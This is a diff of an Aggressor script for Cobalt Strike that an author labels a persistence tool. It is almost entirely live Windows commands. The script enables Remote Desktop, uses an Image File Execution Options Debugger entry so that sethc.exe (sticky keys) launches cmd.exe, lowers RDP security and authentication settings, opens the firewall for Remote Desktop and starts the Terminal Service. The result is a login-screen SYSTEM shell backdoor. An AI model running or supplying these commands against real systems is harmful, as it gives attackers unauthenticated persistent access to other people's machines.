@@ -1,10 +1,21 @@
-### Got to create the files for upload.
+#################################################
+# Created by @jgaudard  :: I don't twitter much
+# Aggressor script for persistence
+# !!! Must create executables for upload. !!!
+# Created: 3 March 2017 Modified: 15 Mar 2017
+# Version 1.0
+#
+# References: 
+# https://blog.cobaltstrike.com/2016/03/16/my-cobalt-strike-scripts-from-neccdc/
+# https://fixingitpro.com/2011/07/06/disabling-rdp-network-level-authentication-nla-remotely-via-the-registry/
+# https://room362.com/post/2012/2012-05-24-sticky-keys-and-utilman-against-nla/
+########################################
 
 sub stickykeys {
     binput($1, 'stickykeys');
     bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f');
-    bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe" /f');
-    bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d "0" /f');
+    bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe" /f');
+    bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d "0" /f');
     bshell($1, 'netsh firewall set service type = remotedesktop mode = enable');
     bshell($1, 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes');
     bshell($1, 'net start TermService');
